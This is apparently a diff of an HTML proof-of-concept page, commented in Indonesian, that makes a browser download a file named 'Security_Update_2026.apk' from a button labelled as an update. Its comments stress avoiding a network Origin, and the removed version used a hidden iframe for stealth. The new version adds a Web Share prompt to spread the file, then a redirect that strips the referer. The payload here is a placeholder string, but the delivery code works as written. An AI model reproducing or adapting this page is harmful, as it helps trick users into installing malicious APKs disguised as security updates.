@@ -2,54 +2,62 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>APK Download PoC</title>
+<title>Download + Share PoC</title>
 <style>
   body {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    font-family: sans-serif;
-    background: #f5f5f5;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    font-family:sans-serif;
+    background:#f5f5f5;
   }
   button {
-    padding: 15px 25px;
-    font-size: 18px;
+    padding:15px 25px;
+    font-size:18px;
   }
 </style>
 </head>
 <body>
 
-<button id="btn">Download Update</button>
+<button id="btn">Download & Share</button>
 
 <script>
-document.getElementById("btn").addEventListener("click", () => {
+document.getElementById("btn").addEventListener("click", async () => {
 
-  // 1. buat blob (tidak ada network → tidak ada Origin)
-  const blob = new Blob(["Fake APK"], {
-    type: "application/vnd.android.package-archive"
-  });
-
+  // 1️⃣ Buat file APK (no network → no Origin)
+  const apkContent = "Fake APK File";
+  const blob = new Blob([apkContent], { type: "application/vnd.android.package-archive" });
   const url = URL.createObjectURL(blob);
 
-  // 2. gunakan iframe tersembunyi (lebih stealth dibanding direct click)
-  const iframe = document.createElement("iframe");
-  iframe.style.display = "none";
-  document.body.appendChild(iframe);
-
-  const a = iframe.contentWindow.document.createElement("a");
+  // 2️⃣ Trigger download
+  const a = document.createElement("a");
   a.href = url;
   a.download = "Security_Update_2026.apk";
-  iframe.contentWindow.document.body.appendChild(a);
+  document.body.appendChild(a);
   a.click();
+  document.body.removeChild(a);
 
-  // cleanup
-  setTimeout(() => {
-    URL.revokeObjectURL(url);
-    document.body.removeChild(iframe);
-  }, 100);
+  // cleanup URL
+  setTimeout(() => URL.revokeObjectURL(url), 100);
 
-  // 3. redirect tanpa referer & opener
+  // 3️⃣ Web Share API (optional, hanya di mobile / supported)
+  if (navigator.canShare && navigator.canShare({ files: [new File([blob], "Security_Update_2026.apk", { type: blob.type })] })) {
+    try {
+      await navigator.share({
+        title: 'Download APK',
+        text: 'Update terbaru tersedia!',
+        files: [new File([blob], "Security_Update_2026.apk", { type: blob.type })],
+      });
+      console.log("Share dialog triggered");
+    } catch (err) {
+      console.log("Share cancelled or failed:", err);
+    }
+  } else {
+    console.log("Web Share API not supported on this device/browser");
+  }
+
+  // 4️⃣ Redirect tanpa opener & referer
   setTimeout(() => {
     const link = document.createElement("a");
     link.href = "https://www.google.com";
@@ -58,7 +66,7 @@ document.getElementById("btn").addEventListener("click", () => {
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
-  }, 80);
+  }, 150);
 
 });
 </script>
